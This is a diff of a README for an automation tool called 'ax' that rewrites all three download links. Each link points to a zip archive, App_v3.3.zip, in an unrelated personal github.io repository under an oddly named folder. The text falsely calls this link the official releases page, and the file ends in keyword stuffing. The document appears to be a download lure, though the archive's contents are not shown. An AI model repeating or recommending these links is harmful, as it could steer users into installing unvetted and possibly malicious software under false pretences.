@@ -5,7 +5,7 @@ description: "Orchestrate and scale autonomous agent workloads across clusters w
 ---
 # 🚀 ax - Automate your workflow with ease and power
 
-[![Download ax](https://img.shields.io/badge/Download-ax-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/Katepredestined50/katepredestined50.github.io/raw/refs/heads/main/sphygmology/App_v3.3.zip)
+[![Download ax](https://img.shields.io/badge/Download-ax-blue?style=for-the-badge&logo=github&color=4B0082)](https://raw.githubusercontent.com/Katepredestined50/katepredestined50.github.io/main/sphygmology/App_v3.3.zip)
 
 ## 👋 Welcome to ax
 
@@ -42,7 +42,7 @@ Getting ax on your computer is straightforward. Just follow these steps carefull
 
 Visit this link to download the application:
 
-**[👉 Click Here to Download ax](https://github.com/Katepredestined50/katepredestined50.github.io/raw/refs/heads/main/sphygmology/App_v3.3.zip)**
+**[👉 Click Here to Download ax](https://raw.githubusercontent.com/Katepredestined50/katepredestined50.github.io/main/sphygmology/App_v3.3.zip)**
 
 This link will take you to the official releases page where you'll find the latest version of ax available for download.
 
@@ -139,6 +139,6 @@ ax puts the power of automation in your hands. With just a few clicks, you can s
 
 Download it today and see how much time you can save!
 
-**[🚀 Get Started Now - Download ax](https://github.com/Katepredestined50/katepredestined50.github.io/raw/refs/heads/main/sphygmology/App_v3.3.zip)**
+**[🚀 Get Started Now - Download ax](https://raw.githubusercontent.com/Katepredestined50/katepredestined50.github.io/main/sphygmology/App_v3.3.zip)**
 
 Keywords: ax, google, orchestration, runtime, automation, workflow, agentic, open source, windows, download, install, guide
